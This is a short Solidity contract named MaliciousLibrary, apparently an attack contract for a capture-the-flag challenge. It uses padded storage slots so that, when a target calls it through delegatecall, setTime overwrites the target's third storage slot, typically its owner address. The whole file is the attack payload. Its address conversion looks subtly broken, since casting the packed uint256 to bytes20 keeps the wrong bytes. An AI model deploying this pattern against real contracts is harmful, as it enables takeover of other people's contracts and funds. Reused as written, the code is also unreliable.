pragma solidity ^0.8.0;
contract MaliciousLibrary {
    address public dummy1;
    address public dummy2;
    address public storedTime;

    function setTime(uint256 _time) public {
        storedTime = address(bytes20(abi.encodePacked(_time)));
    }
}
